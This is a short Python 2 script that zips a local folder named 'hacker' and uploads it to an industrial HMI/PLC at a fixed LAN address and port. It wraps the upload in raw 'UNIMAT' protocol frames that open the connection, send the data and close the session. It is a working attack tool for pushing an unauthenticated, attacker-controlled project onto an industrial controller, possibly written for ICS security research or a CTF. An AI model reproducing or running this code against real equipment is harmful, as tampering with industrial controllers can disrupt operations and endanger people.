#!/usr/bin/python2
#coding:utf-8

# author: lightk

import os
import time
import socket
import zipfile
import struct


# HMI address 

PLC_ADDR = "192.168.1.4"
PLC_PORT = int("8234")


def zipDir(dirpath,outFullName):
    zip = zipfile.ZipFile(outFullName,"w",zipfile.ZIP_DEFLATED)
    for path,dirnames,filenames in os.walk(dirpath):       
        fpath = path.replace(dirpath,'')
        for filename in filenames:
            zip.write(os.path.join(path,filename),os.path.join(fpath,filename))
    zip.close()




if __name__ == "__main__":
    
    myzip = "hacker.zip"
    
    zipDir("./hacker",myzip)
    
    size = os.path.getsize(myzip)

    create_connect_payload1 = '\x55\x4e\x49\x4d\x41\x54\x03\x00\x00\x00\x00\x00'
    create_connect_payload2 = '\x55\x4e\x49\x4d\x41\x54\x04\x00\x00\x00\x00\x00'
    
    end_connect_payload1 = '\x55\x4e\x49\x4d\x41\x54\x0b\x00\x02\x00\x00\x00\xe2\xc6'
    end_connect_payload2 = '\x55\x4e\x49\x4d\x41\x54\x0a\x00\x00\x00\x00\x00'
    
    end_connect_payload_a = '\x55\x4e\x49\x4d\x41\x54\x01\x00\x00\x00\x00\x00'
    
    

    data_start = "\x55\x4e\x49\x4d\x41\x54\x06\x00"
    data_lenstr = struct.pack("<I",size)
    
    print size
    
    print ["%02x" % ord(x) for x in data_lenstr]
    data = open(myzip,"rb").read(size)
    

    payload = data_start+data_lenstr+data

    s = socket.socket()
    s.connect((PLC_ADDR, PLC_PORT))
    time.sleep(0.25)
    s.send(create_connect_payload1)
    print s.recv(1024)
    time.sleep(0.25)
    
    s.send(create_connect_payload2)
    print s.recv(1024)
    time.sleep(0.25)
    
    
    length = len(payload)
    
    n = length / 1024
    k = length % 1024
    
    for i in range(n):
        
        s.send(payload[i*1024:(i+1)*1024])
    
    s.send(payload[-k:])
        
    time.sleep(0.5)
    s.recv(1024)
    
    s.send(end_connect_payload1)
    print s.recv(1024)
    time.sleep(0.25)
    
    s.send(end_connect_payload2)
    print s.recv(1024)
    time.sleep(0.25)
    
    s.send(end_connect_payload_a)
    print s.recv(1024)
    time.sleep(0.25)


    s.close()
